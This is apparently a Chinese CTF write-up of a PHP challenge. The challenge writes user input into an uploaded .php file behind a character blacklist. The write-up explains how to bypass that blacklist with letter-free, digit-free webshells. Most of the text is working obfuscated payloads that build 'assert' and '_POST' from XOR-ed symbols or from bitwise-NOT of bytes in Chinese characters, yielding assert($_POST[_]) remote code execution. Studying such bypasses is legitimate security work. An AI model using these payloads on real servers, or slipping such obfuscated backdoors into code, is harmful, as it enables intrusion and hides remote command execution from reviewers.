### 源码
```php
<?php
ini_set("display_errors", "On");
error_reporting(E_ALL | E_STRICT);
if(!isset($_GET['c'])){
   show_source(__FILE__);
   die();
}
function rand_string( $length ) {
   $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";    
   $size = strlen( $chars );
   $str = '';
   for($i = 0; $i < $length; $i++) {
	   $str .= $chars[ rand( 0, $size - 1 ) ];
   }
   return $str;
}
$data = $_GET['c'];
$black_list = array(' ', '!', '"', '#', '%', '&', '*', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '\\', '^', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '|', '~');
foreach ($black_list as $b) {
   if (stripos($data, $b) !== false){
	   die("WAF!");
   }
}
$filename=rand_string(0x20).'.php';
$folder='uploads/';
$full_filename = $folder.$filename;
if(file_put_contents($full_filename, '<?php '.$data)){
   echo "<a href='".$full_filename."'>WebShell</a></br>";
   echo "Enjoy your webshell~";
}else{
   echo "Some thing wrong...";
}
```
### 漏洞成因
**哪有什么漏洞，就是他妈的php特性而已**
- 看p神的文章：[https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4)
#### 方法一
这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。
得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了
- 两个字母，通过异或来编码webshell
```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```
#### 方法二
- 跟汉字取反
![](Pasted%20image%2020230514190332.png)
和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。
**方法二利用的是UTF-8编码的某个汉字**，并将其中某个字符取出来，比如`'`和`'{2}`的结果是`"\x8c"`，其取反即为字母s：
```php
<?php
$__=('>'>'<')+('>'>'<');
$_=$__/$__;

$____='';
$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});

$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});

$_=$$_____;
$____($_[$__]);
```
具体查看：[无字母WebShell](无字母WebShell.md)
### 异或
[常规攻击（普通异或绕过）](无字母WebShell.md#常规攻击（普通异或绕过）)
### 中文
[常规攻击（中文方法）（二）](无字母WebShell.md#常规攻击（中文方法）（二）)
```php
<?php
function info(){
    echo "hack";
}
$i++;
$a = "又";
$_ .= ~($a{$i});
$_ .= ~($a{$i});
$a = "门";
$_ .= ~($a{$i});
$a = "又";
$_ .= ~($a{$i});
$_ .= ~($a{$i});
$a = "斤";
$_ = ~($a{$i});
$a = "呈";
$_ .= ~($a{$i});
$a = "白";
$_ .= ~($a{$i});
$a = "吉";
$_ .= ~($a{$i});
$_();
```
### 参考
+ [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4)
+ [php特殊webshell(无数字,字母,位运算)](http://www.jianshu.com/p/d23d4b1358f2)
+ [一道好玩的webshell题](https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/)